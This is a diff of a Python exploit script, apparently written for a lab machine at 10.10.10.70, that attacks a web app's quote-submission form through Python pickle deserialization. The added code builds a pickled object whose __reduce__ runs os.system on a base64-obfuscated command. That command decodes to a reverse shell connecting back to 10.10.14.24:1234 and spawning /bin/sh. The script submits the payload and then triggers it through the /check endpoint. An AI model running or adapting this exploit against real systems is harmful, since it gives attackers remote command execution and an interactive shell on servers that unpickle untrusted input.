@@ -3,49 +3,49 @@
 # First draft
 __author__ = 'nighter@nighter.se'
 
-import requests
-import couchdb
 import string
 import random
 import base64
 import cPickle
-import sys
 import os
-import re
+import time
 
+from requests import post
 from hashlib import md5
 
-HOST = 'http://localhost:5000'
+HOST = 'http://10.10.10.70'
+COMMAND = 'echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMjQiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=|base64 -d|bash'
 
-def submit(character='', quote=''):
+class PicklePayload(object):
+    def __reduce__(self):
+        return (os.system, (COMMAND,))
 
-    session = requests.Session()
-    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
-               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-               'Accept-Language': 'en-US,en;q=0.5',
-               'Accept-Encoding': 'zip, deflate',
-               'Referer': 'http://localhost:5000/submit',
-               'Content-Type': 'application/x-www-form-urlencoded',
-               'Content-Length': 'close',
-               'Upgrade-Insecure-Requests': '1'}
+def createPayload():
+    return cPickle.dumps(PicklePayload())
 
+def submit(char='', quote=''):
 
-    postData = "character=" + character + "&quote=" + quote
-    r = session.post(HOST + '/submit', data=postData, headers=headers)
-    #m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
-    print(r.text)
+    data = {"character": char, "quote": quote}
+    submit = post(HOST + '/submit', data=data)
+    if submit.status_code == 200:
+        print("Submit ok.")
+    else:
+        print("Submit error.")
 
-def check(character='', quote=''):
+def check(p_id):
+    p = post(HOST + '/check', data={"id": p_id})
+    print(p.status_code)
 
-    p_id = md5(character + quote).hexdigest()
-    session = requests.Session()
-    postData = {"id": p_id}
-    r = session.post(HOST + '/check', data=postData)
-    print(r.text)
+def exploit():
 
+    char = createPayload() + "homer"
+    quote = "1337"
+    p_id = md5(char + quote).hexdigest()
 
+    submit(char, quote)
+    time.sleep(1)
+    check(p_id)
 
 if __name__ == '__main__':
 
-    submit('Homer', 'Hello')
-
+    exploit()
